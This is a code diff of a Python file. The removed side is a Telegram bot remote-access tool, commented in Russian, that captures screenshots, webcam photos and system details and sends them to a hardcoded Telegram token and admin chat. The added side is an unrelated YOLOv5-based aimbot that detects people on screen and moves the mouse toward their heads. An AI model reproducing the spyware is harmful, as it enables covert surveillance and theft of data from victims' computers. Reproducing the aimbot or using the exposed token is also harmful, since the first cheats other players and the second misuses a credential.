@@ -1,181 +1,180 @@
-import os
-import sys
-import socket
-import threading
-import time
-import telebot
-from PIL import ImageGrab
-import cv2
+import torch
 import numpy as np
-import pyautogui
-import platform
-import psutil
-import tkinter as tk
-from tkinter import messagebox
-from telebot import types
+import cv2
+import time
+import win32api
+import win32con
+import pandas as pd
+import gc
+from utils.general import (cv2, non_max_suppression, xyxy2xywh)
 
-TOKEN = '8077328902:AAEumOjor9A0tdEWg0wD6qEFmaOSwB8LDTY'
-ADMIN_CHAT_ID = '7407115131'
+# Could be do with
+# from config import *
+# But we are writing it out for clarity for new devs
+from config import aaMovementAmp, useMask, maskWidth, maskHeight, aaQuitKey, screenShotHeight, confidence, headshot_mode, cpsDisplay, visuals, centerOfScreen
+import gameSelection
 
-# Словарь для не работоющих айпишников компьютеров (автоматически обновляется)
-computers = {}
-current_computer = None
+def main():
+    # External Function for running the game selection menu (gameSelection.py)
+    camera, cWidth, cHeight = gameSelection.gameSelection()
 
-bot = telebot.TeleBot(TOKEN)
-is_recording_screen = False
-is_recording_camera = False
-video_writer = None
-camera = None
+    # Used for forcing garbage collection
+    count = 0
+    sTime = time.time()
 
-def update_computers_list():
-   
-    global computers
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    computers = {
-        ip_address: f"{hostname} (Текущий)"
-    }
+    # Loading Yolo5 Small AI Model, for better results use yolov5m or yolov5l
+    model = torch.hub.load('ultralytics/yolov5', 'yolov5s',
+                           pretrained=True, force_reload=True)
+    stride, names, pt = model.stride, model.names, model.pt
 
-def show_alert(text):
-    root = tk.Tk()
-    root.withdraw()
-    root.attributes("-topmost", True)
-    messagebox.showwarning("Внимание!", text)
-    root.destroy()
+    if torch.cuda.is_available():
+        model.half()
 
-def send_computers_list():
-    try:
-        message = "Доступные компьютеры:\n"
-        for ip, name in computers.items():
-            message += f"\n🖥️ {name}\nIP: {ip}\n"
-        bot.send_message(ADMIN_CHAT_ID, message)
-    except Exception as e:
-        print(f"Ошибка отправки списка: {e}")
+    # Used for colors drawn on bounding boxes
+    COLORS = np.random.uniform(0, 255, size=(1500, 3))
 
-def take_screenshot():
-    screenshot = ImageGrab.grab()
-    filename = f"screenshot_{int(time.time())}.png"
-    screenshot.save(filename)
-    return filename
+    # Main loop Quit if Q is pressed
+    last_mid_coord = None
+    with torch.no_grad():
+        while win32api.GetAsyncKeyState(ord(aaQuitKey)) == 0:
 
-def take_photo():
-    cap = cv2.VideoCapture(0)
-    ret, frame = cap.read()
-    filename = f"photo_{int(time.time())}.png"
-    cv2.imwrite(filename, frame)
-    cap.release()
-    return filename
+            # Getting Frame
+            npImg = np.array(camera.get_latest_frame())
 
-def get_system_info():
-    info = []
-    info.append(f"💻 ОС: {platform.system()} {platform.release()}")
-    info.append(f"🔢 Версия: {platform.version()}")
-    info.append(f"⚡ Процессор: {platform.processor()}")
-    info.append(f"🧮 Ядер: {psutil.cpu_count(logical=False)}")
-    mem = psutil.virtual_memory()
-    info.append(f"🧠 Память: {mem.used//(1024**3)}/{mem.total//(1024**3)} GB")
-    for part in psutil.disk_partitions():
-        usage = psutil.disk_usage(part.mountpoint)
-        info.append(f"💾 {part.device}: {usage.used//(1024**3)}/{usage.total//(1024**3)} GB")
-    return "\n".join(info)
+            from config import maskSide # "temporary" workaround for bad syntax
+            if useMask:
+                maskSide = maskSide.lower()
+                if maskSide == "right":
+                    npImg[-maskHeight:, -maskWidth:, :] = 0
+                elif maskSide == "left":
+                    npImg[-maskHeight:, :maskWidth, :] = 0
+                else:
+                    raise Exception('ERROR: Invalid maskSide! Please use "left" or "right"')
 
-def safe_shutdown():
-    os._exit(0)
+            # Normalizing Data
+            im = torch.from_numpy(npImg)
+            if im.shape[2] == 4:
+                # If the image has an alpha channel, remove it
+                im = im[:, :, :3,]
 
-def remove_keyboard():
-    return types.ReplyKeyboardRemove()
+            im = torch.movedim(im, 2, 0)
+            if torch.cuda.is_available():
+                im = im.half()
+                im /= 255
+            if len(im.shape) == 3:
+                im = im[None]
 
-def show_start_button(chat_id):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(types.KeyboardButton('/start'))
-    bot.send_message(chat_id, "Программа остановлена. Нажмите /start для повторного запуска.", reply_markup=markup)
+            # Detecting all the objects
+            results = model(im, size=screenShotHeight)
 
-@bot.message_handler(commands=['start'])
-def select_computer(message):
-    if str(message.chat.id) != ADMIN_CHAT_ID:
-        return
-    
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    for ip, name in computers.items():
-        markup.add(types.KeyboardButton(f"🖥️ {name} | {ip}"))
-    bot.send_message(message.chat.id, "Выберите компьютер:", reply_markup=markup)
+            # Suppressing results that dont meet thresholds
+            pred = non_max_suppression(
+                results, confidence, confidence, 0, False, max_det=1000)
 
-@bot.message_handler(func=lambda m: m.text.startswith('🖥️'))
-def handle_computer_selection(message):
-    global current_computer
-    try:
-        ip = message.text.split('|')[-1].strip()
-        current_computer = ip
-        show_main_menu(message.chat.id)
-    except Exception as e:
-        bot.reply_to(message, f"Ошибка выбора: {e}")
+            # Converting output to usable cords
+            targets = []
+            for i, det in enumerate(pred):
+                s = ""
+                gn = torch.tensor(im.shape)[[0, 0, 0, 0]]
+                if len(det):
+                    for c in det[:, -1].unique():
+                        n = (det[:, -1] == c).sum()  # detections per class
+                        s += f"{n} {names[int(c)]}, "  # add to string
 
-def show_main_menu(chat_id):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    buttons = [
-        types.KeyboardButton('Скриншот📸'),
-        types.KeyboardButton('Фото🖼'),
-        types.KeyboardButton('Сообщение на экран ПК📩'),
-        types.KeyboardButton('Записать видео🎥'),
-        types.KeyboardButton('Информация о юзере (HWID)💻'),
-        types.KeyboardButton('Выключить🛑'),
-        types.KeyboardButton('Сменить компьютер↩️')
-    ]
-    markup.add(*buttons)
-    bot.send_message(chat_id, f"Управление компьютером:\nIP: {current_computer}", reply_markup=markup)
+                    for *xyxy, conf, cls in reversed(det):
+                        targets.append((xyxy2xywh(torch.tensor(xyxy).view(
+                            1, 4)) / gn).view(-1).tolist() + [float(conf)])  # normalized xywh
 
-@bot.message_handler(func=lambda m: m.text == 'Сменить компьютер↩️')
-def change_computer(message):
-    select_computer(message)
+            targets = pd.DataFrame(
+                targets, columns=['current_mid_x', 'current_mid_y', 'width', "height", "confidence"])
 
-@bot.message_handler(func=lambda m: m.text == 'Скриншот📸')
-def send_screenshot(message):
-    try:
-        with open(take_screenshot(), 'rb') as photo:
-            bot.send_photo(message.chat.id, photo)
-        os.remove(photo.name)
-    except Exception as e:
-        bot.reply_to(message, f"Ошибка: {e}")
+            center_screen = [cWidth, cHeight]
 
-@bot.message_handler(func=lambda m: m.text == 'Информация о юзере (HWID)💻')
-def send_system_info(message):
-    bot.reply_to(message, get_system_info())
+            # If there are people in the center bounding box
+            if len(targets) > 0:
+                if (centerOfScreen):
+                    # Compute the distance from the center
+                    targets["dist_from_center"] = np.sqrt((targets.current_mid_x - center_screen[0])**2 + (targets.current_mid_y - center_screen[1])**2)
 
-@bot.message_handler(func=lambda m: m.text == 'Сообщение на экран ПК📩')
-def ask_message(message):
-    msg = bot.reply_to(message, "Введите текст сообщения:")
-    bot.register_next_step_handler(msg, show_on_screen)
+                    # Sort the data frame by distance from center
+                    targets = targets.sort_values("dist_from_center")
 
-def show_on_screen(message):
-    show_alert(message.text)
-    bot.reply_to(message, "Сообщение показано!✅")
+                # Get the last persons mid coordinate if it exists
+                if last_mid_coord:
+                    targets['last_mid_x'] = last_mid_coord[0]
+                    targets['last_mid_y'] = last_mid_coord[1]
+                    # Take distance between current person mid coordinate and last person mid coordinate
+                    targets['dist'] = np.linalg.norm(
+                        targets.iloc[:, [0, 1]].values - targets.iloc[:, [4, 5]], axis=1)
+                    targets.sort_values(by="dist", ascending=False)
 
-@bot.message_handler(func=lambda m: m.text == 'Выключить🛑')
-def confirm_shutdown(message):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(types.KeyboardButton('Подтвердить✅'), types.KeyboardButton('Отмена❌'))
-    bot.send_message(message.chat.id, "Вы уверены, что хотите выключить программу?", reply_markup=markup)
+                # Take the first person that shows up in the dataframe (Recall that we sort based on Euclidean distance)
+                xMid = targets.iloc[0].current_mid_x
+                yMid = targets.iloc[0].current_mid_y
 
-@bot.message_handler(func=lambda m: m.text == 'Подтвердить✅')
-def shutdown(message):
-    bot.send_message(message.chat.id, "Программа остановлена!", reply_markup=remove_keyboard())
-    show_start_button(message.chat.id)
-    threading.Thread(target=safe_shutdown).start()
+                box_height = targets.iloc[0].height
+                if headshot_mode:
+                    headshot_offset = box_height * 0.38
+                else:
+                    headshot_offset = box_height * 0.2
 
-@bot.message_handler(func=lambda m: m.text == 'Отмена❌')
-def cancel_shutdown(message):
-    show_main_menu(message.chat.id)
+                mouseMove = [xMid - cWidth, (yMid - headshot_offset) - cHeight]
 
-def run_bot():
-    bot.polling(none_stop=True)
+                # Moving the mouse
+                if win32api.GetKeyState(0x14):
+                    win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, int(
+                        mouseMove[0] * aaMovementAmp), int(mouseMove[1] * aaMovementAmp), 0, 0)
+                last_mid_coord = [xMid, yMid]
+
+            else:
+                last_mid_coord = None
+
+            # See what the bot sees
+            if visuals:
+                # Loops over every item identified and draws a bounding box
+                for i in range(0, len(targets)):
+                    halfW = round(targets["width"][i] / 2)
+                    halfH = round(targets["height"][i] / 2)
+                    midX = targets['current_mid_x'][i]
+                    midY = targets['current_mid_y'][i]
+                    (startX, startY, endX, endY) = int(
+                        midX + halfW), int(midY + halfH), int(midX - halfW), int(midY - halfH)
+
+                    idx = 0
+
+                    # draw the bounding box and label on the frame
+                    label = "{}: {:.2f}%".format(
+                        "Human", targets["confidence"][i] * 100)
+                    cv2.rectangle(npImg, (startX, startY), (endX, endY),
+                                  COLORS[idx], 2)
+                    y = startY - 15 if startY - 15 > 15 else startY + 15
+                    cv2.putText(npImg, label, (startX, y),
+                                cv2.FONT_HERSHEY_SIMPLEX, 0.5, COLORS[idx], 2)
+
+            # Forced garbage cleanup every second
+            count += 1
+            if (time.time() - sTime) > 1:
+                if cpsDisplay:
+                    print("CPS: {}".format(count))
+                count = 0
+                sTime = time.time()
+
+                # Uncomment if you keep running into memory issues
+                # gc.collect(generation=0)
+
+            # See visually what the Aimbot sees
+            if visuals:
+                cv2.imshow('Live Feed', npImg)
+                if (cv2.waitKey(1) & 0xFF) == ord('q'):
+                    exit()
+    camera.stop()
+
 
 if __name__ == "__main__":
-    update_computers_list()
-    send_computers_list()
-    threading.Thread(target=run_bot, daemon=True).start()
-    
     try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Программа завершена")
+        main()
+    except Exception as e:
+        import traceback
+        traceback.print_exception(e)
+        print("ERROR: " + str(e))
+        print("Ask @Wonder for help in our Discord in the #ai-aimbot channel ONLY: https://discord.gg/rootkitorg")
